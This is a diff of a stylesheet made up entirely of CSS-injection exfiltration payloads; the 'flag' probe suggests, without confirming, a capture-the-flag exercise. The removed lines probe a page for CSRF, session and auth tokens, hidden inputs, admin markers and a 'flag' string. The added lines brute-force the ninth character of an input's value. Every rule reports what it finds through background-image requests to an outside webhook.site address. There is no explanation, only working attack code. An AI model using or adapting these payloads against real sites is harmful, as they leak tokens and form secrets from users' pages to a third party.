@@ -1,107 +1,37 @@
-/* META tags with common token names */
-html:has(meta[name="csrf-token"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_csrf=1");
-}
-html:has(meta[name="csrf-token"][content^="a"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_csrf_a=1");
-}
-html:has(meta[name="session-token"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_session=1");
-}
-html:has(meta[name="auth-token"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_auth=1");
-}
-html:has(meta[name="token"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_token=1");
-}
+input[value^="________a"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=a"); }
+input[value^="________b"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=b"); }
+input[value^="________c"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=c"); }
+input[value^="________d"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=d"); }
+input[value^="________e"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=e"); }
+input[value^="________f"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=f"); }
+input[value^="________g"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=g"); }
+input[value^="________h"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=h"); }
+input[value^="________i"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=i"); }
+input[value^="________j"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=j"); }
+input[value^="________k"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=k"); }
+input[value^="________l"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=l"); }
+input[value^="________m"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=m"); }
+input[value^="________n"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=n"); }
+input[value^="________o"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=o"); }
+input[value^="________p"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=p"); }
+input[value^="________q"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=q"); }
+input[value^="________r"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=r"); }
+input[value^="________s"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=s"); }
+input[value^="________t"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=t"); }
+input[value^="________u"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=u"); }
+input[value^="________v"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=v"); }
+input[value^="________w"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=w"); }
+input[value^="________x"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=x"); }
+input[value^="________y"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=y"); }
+input[value^="________z"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=z"); }
 
-/* BODY with data attributes */
-body[data-logged-in="true"] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?body_loggedin_true=1");
-}
-body[data-user] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?body_datauser=1");
-}
-body[data-role="admin"] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?body_role_admin=1");
-}
-
-/* Check for profile-related elements */
-html:has(#user-profile) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?user_profile=1");
-}
-html:has(.user-info) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?user_info=1");
-}
-html:has(.logout-button) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?logout=1");
-}
-
-/* Check for form inputs that might indicate logged-in state */
-form:has(input[name="username"][value]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?form_username_value=1");
-}
-form:has(input[name="password"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?form_password=1");
-}
-form:has(input[name="csrf-token"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?form_csrf=1");
-}
-
-/* Check for cookies or tokens in data attributes */
-html:has([data-cookie]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?data_cookie=1");
-}
-html:has([data-token]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?data_token=1");
-}
-
-/* Check for admin-specific text in visible elements */
-.loginbox:has(:contains("Admin")) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?loginbox_admin=1");
-}
-
-/* General check for inputs with any value */
-input[value] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?input_value=1");
-}
-
-/* Check for presence of logout link or button */
-a[href="/logout"], button.logout {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?logout_button=1");
-}
-
-/* Check for any element with id or class containing "admin" */
-html:has([id*="admin"]), html:has([class*="admin"]) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?admin_id_class=1");
-}
-
-/* Check if body has class logged-in */
-body.logged-in {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?body_logged_in_class=1");
-}
-
-/* Check for presence of flag keyword anywhere */
-html:has(*:contains("flag")) {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_found=1");
-}
-
-/* Check for any input with name containing "token" */
-input[name*="token"] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?input_name_token=1");
-}
-
-/* Check for presence of hidden inputs (usually tokens) */
-input[type="hidden"] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?input_hidden=1");
-}
-
-/* Check for any meta refresh tag */
-meta[http-equiv="refresh"] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_refresh=1");
-}
-
-/* Check for any script tags with src */
-script[src] {
-  background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?script_src=1");
-}
+input[value^="________0"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=0"); }
+input[value^="________1"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=1"); }
+input[value^="________2"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=2"); }
+input[value^="________3"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=3"); }
+input[value^="________4"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=4"); }
+input[value^="________5"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=5"); }
+input[value^="________6"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=6"); }
+input[value^="________7"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=7"); }
+input[value^="________8"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=8"); }
+input[value^="________9"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=9"); }
